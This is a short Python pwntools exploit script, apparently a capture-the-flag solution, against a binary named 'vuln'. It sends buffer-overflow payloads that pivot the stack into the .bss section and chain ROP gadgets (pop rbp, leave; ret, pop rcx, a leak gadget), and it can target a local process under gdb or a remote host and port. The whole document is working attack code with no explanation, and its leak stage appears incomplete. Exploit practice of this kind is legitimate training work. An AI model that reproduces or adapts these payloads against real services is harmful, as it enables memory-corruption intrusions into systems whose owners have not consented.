#!/usr/bin/env python3 

from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'
gs = '''
# b*0x0000000000401205
b*0x0000000000401218
'''
def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p

p = init()
pop_rbp = p64(0x0000000000401180)
bss =  0x404000
rbp = p64(bss)
leave_ret = p64(0x00000000004011cd)
leak_gadget = p64(0x401211)
write = p64(0x0000000000401205)
pop_rcx = p64(0x000000000040117e)
# puts_var = p64()

# stack pivot:
payload = flat(
    b"A"*32,
    p64(bss+0x50),
    write,
)
p.sendline(payload)
payload = flat(
    b"A"*8,
    pop_rbp,
    p64(bss + 0x270-0x8),
    leave_ret,  
    b"A"*8,
    pop_rbp,
    p64(bss+0x30),  
    pop_rcx*0x40,
    leak_gadget,
    write,
)

input()
p.sendline(payload)


p.interactive()

